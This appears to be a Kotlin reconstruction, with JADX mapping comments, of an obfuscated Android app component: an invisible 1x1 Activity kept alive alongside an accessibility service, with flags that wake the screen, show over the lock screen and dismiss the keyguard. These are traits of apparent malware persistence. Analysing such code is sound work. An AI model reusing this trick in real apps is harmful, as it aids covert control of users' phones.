package com.storm.safe.rock.p029ui

import android.app.Activity
import android.os.Bundle
import android.util.Log
import com.storm.safe.rock.service.MyAccessibilityService

/**
 * JADX: p029ui/ibbnqvnvhxg.java (67 lines)
 * Minimal 1x1 pixel transparent Activity used as a process-alive anchor.
 *
 * When created, sets window to 1x1 px with no-title + various flags,
 * then resets isWebViewOpen on the accessibility service.
 *
 * JADX references:
 * - f55195a1 → static volatile instance reference
 * - dqtvuisjd.f52358m1 → MyAccessibilityService.Companion
 * - c0290a0.f52479l0 → MyAccessibilityService.isWebViewOpen
 * - t60.m214686a2 → identity equals check
 */
class ibbnqvnvhxg : Activity() {

    companion object {
        private const val TAG = "ibbnqvnvhxg"

        @Volatile
        @JvmStatic
        var instance: ibbnqvnvhxg? = null

        /**
         * Finish the activity if it is currently running.
         * JADX: C0383a0.finishIfRunning
         */
        fun finishIfRunning() {
            instance?.finish()
        }

        /**
         * Check if the activity is currently alive.
         * JADX: C0383a0.isRunning
         */
        fun isRunning(): Boolean = instance != null
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestWindowFeature(android.view.Window.FEATURE_NO_TITLE)
        window.setSoftInputMode(3) // SOFT_INPUT_STATE_ALWAYS_HIDDEN
        // FLAGS: 4719120 = keep_screen_on + turn_screen_on + show_when_locked + dismiss_keyguard + fullscreen
        window.addFlags(4719120)
        window.setLayout(1, 1)
        instance = this
        val service = MyAccessibilityService.getInstance()
        if (service != null) {
            MyAccessibilityService.isWebViewOpen = false
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance === this) {
            instance = null
            val service = MyAccessibilityService.getInstance()
            if (service != null) {
                MyAccessibilityService.isWebViewOpen = false
            }
        }
    }
}
